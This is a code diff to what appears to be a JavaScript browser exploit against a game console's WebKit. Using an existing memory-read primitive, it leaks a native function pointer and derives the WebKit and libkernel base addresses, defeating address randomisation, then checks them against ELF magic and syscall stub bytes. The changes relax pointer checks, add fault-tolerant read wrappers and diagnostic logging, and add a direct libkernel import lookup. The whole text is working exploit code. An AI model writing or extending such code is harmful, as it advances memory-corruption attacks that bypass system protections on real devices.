@@ -217,9 +217,17 @@ function plausibleUserPtr(v) {
     if (!v || typeof v !== "object" || !("low" in v)) return false;
     const hi = v.hi >>> 0;
     const lo = v.low >>> 0;
-    if (hi === 0 || hi > 0xffff) return false;
+    if (hi > 0xffff) return false;
     if (lo === 0 && hi === 0) return false;
     return true;
+}
+
+function read8p(p, addr) {
+    try { return p.read8(addr); } catch (_) { return null; }
+}
+
+function read4p(p, addr) {
+    try { return p.read4(addr); } catch (_) { return null; }
 }
 
 function safeRead8(p, addr) {
@@ -242,11 +250,18 @@ function safeRead4(p, addr) {
 
 function captureNativeFn(p, mFunctionOff) {
     const cell = p.leakval(Math.expm1);
-    const mid = safeRead8(p, cell.add32(0x18));
-    if (!mid) return null;
-    const nativeFn = safeRead8(p, mid.add32(mFunctionOff));
-    if (!nativeFn) return null;
-    probeCache = { nativeFn, mFunctionOff };
+    mark("CAL-CELL", String(cell));
+    const mid = read8p(p, cell.add32(0x18));
+    if (!mid) {
+        mark("CAL-FAIL", "cell+0x18 unreadable");
+        return null;
+    }
+    const nativeFn = read8p(p, mid.add32(mFunctionOff));
+    if (!nativeFn) {
+        mark("CAL-FAIL", "native fn ptr unreadable mid=" + mid);
+        return null;
+    }
+    probeCache = { nativeFn, mFunctionOff, cell, mid };
     return nativeFn;
 }
 
@@ -260,9 +275,10 @@ function calibrateLiteSync(p, tableOff) {
     const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
     const nativeFn = nativeFnForOff(p, mFunctionOff);
     if (!nativeFn) {
-        mark("CAL-FAIL", "nativeFn unreadable");
+        mark("CAL-FAIL", "nativeFn unresolved");
         return null;
     }
+    mark("CAL-NATIVEFN", String(nativeFn));
 
     const hint = tableOff.wk_expm1_builtin;
     if (hint == null) {
@@ -271,26 +287,28 @@ function calibrateLiteSync(p, tableOff) {
     }
 
     const base = nativeFn.sub32(hint);
-    if (!alignedWebkitBase(base)) {
-        mark("CAL-FAIL", "base not 0x4000-aligned base=" + base);
-        return null;
-    }
+    const magic = read4p(p, base);
+    const aligned = alignedWebkitBase(base);
 
-    const magic = safeRead4(p, base);
+    mark("CAL-DIAG", "base=" + base + " magic=0x"
+        + (magic == null ? "null" : magic.toString(16))
+        + " aligned=" + aligned);
+
     if (magic !== 0x464c457f) {
         mark("CAL-FAIL", "ELF miss at hint=0x" + hint.toString(16));
-        mark("CAL-NATIVEFN", String(nativeFn));
-        mark("HINT", "wrong FW row — try 13.00/13.50 dropdown, or ?narrow=1 step 3");
         return null;
+    }
+    if (!aligned) {
+        mark("CAL-WARN", "base not 0x4000-aligned but ELF ok");
     }
 
     mark("CAL-OK", "table-hint base=" + base + " expm1=0x" + hint.toString(16));
 
-    const err = tryTableErrorImport(p, base, tableOff);
+    const err = tryTableErrorImportDirect(p, base, tableOff);
     if (err)
         mark("CAL-ERROR", "table import OK lk=" + err.libkernelBase);
     else
-        mark("CAL-WARN", "libkernel import miss — offsets may still work for AB");
+        mark("CAL-WARN", "libkernel import miss — AB test may still pass");
 
     const live = Object.assign({
         fw_status: "calibrated inline",
@@ -303,6 +321,23 @@ function calibrateLiteSync(p, tableOff) {
     calibratedOff = live;
     mark("PASTE-OFFSETS", JSON.stringify(live));
     return live;
+}
+
+function tryTableErrorImportDirect(p, webkitBase, tableOff) {
+    if (!tableOff.wk___imp___error || !tableOff.k__error) return null;
+    const errorFn = read8p(p, webkitBase.add32(tableOff.wk___imp___error));
+    if (!errorFn) return null;
+    const lk = errorFn.sub32(tableOff.k__error);
+    const w0 = read4p(p, lk);
+    const w1 = read4p(p, lk.add32(4));
+    if (w0 == null || w1 == null) return null;
+    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+        return {
+            wk___imp___error: tableOff.wk___imp___error,
+            k__error: tableOff.k__error,
+            libkernelBase: lk
+        };
+    return null;
 }
 
 async function tryTableHint(p, tableOff) {
@@ -394,7 +429,7 @@ function computeBases(p, off) {
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     if (!off.wk___imp___error || !off.k__error)
         return { nativeFn, webkitBase, libkernelBase: null };
-    const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
+    const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
     if (!errorFn)
         return { nativeFn, webkitBase, libkernelBase: null, error: "error import unreadable" };
     const libkernelBase = errorFn.sub32(off.k__error);
@@ -428,9 +463,9 @@ function verifyBases(p, off, checkOffset) {
 
 function bufAddr(p, off, ab) {
     const cell = p.leakval(ab);
-    const impl = safeRead8(p, cell.add32(off.wk_ArrayBuffer_m_impl));
+    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
     if (!impl) return null;
-    return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
+    return read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
 }
 
 async function calibrateOffsets(p, tableOff, opts) {
@@ -611,7 +646,7 @@ async function runOffsetTests() {
     if (!dataPtr) {
         checkOffset("arraybuffer-backing", false, "bufAddr failed — impl chain wrong");
     } else {
-        const got = safeRead4(p, dataPtr);
+        const got = read4p(p, dataPtr);
         checkOffset("arraybuffer-read4",
             got === 0xdeadbeef,
             "got=" + (got == null ? "null" : "0x" + got.toString(16)));
